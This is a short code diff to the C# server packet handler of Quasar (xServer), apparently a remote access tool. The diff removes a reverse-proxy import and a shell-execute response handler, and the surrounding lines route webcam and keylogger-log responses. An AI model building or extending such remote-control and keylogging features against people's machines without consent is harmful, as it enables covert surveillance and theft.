@@ -1,6 +1,5 @@
 ﻿using Quasar.Common.Messages;
 using xServer.Core.Commands;
-using xServer.Core.ReverseProxy;
 
 namespace xServer.Core.Networking
 {
@@ -28,11 +27,6 @@ namespace xServer.Core.Networking
             else if (type == typeof(GetWebcamResponse))
             {
                 CommandHandler.HandleGetWebcamResponse(client, (GetWebcamResponse)packet);
-            }
-            else if (type == typeof(DoShellExecuteResponse))
-            {
-                CommandHandler.HandleDoShellExecuteResponse(client,
-                    (DoShellExecuteResponse)packet);
             }
             else if (type == typeof(GetKeyloggerLogsResponse))
             {
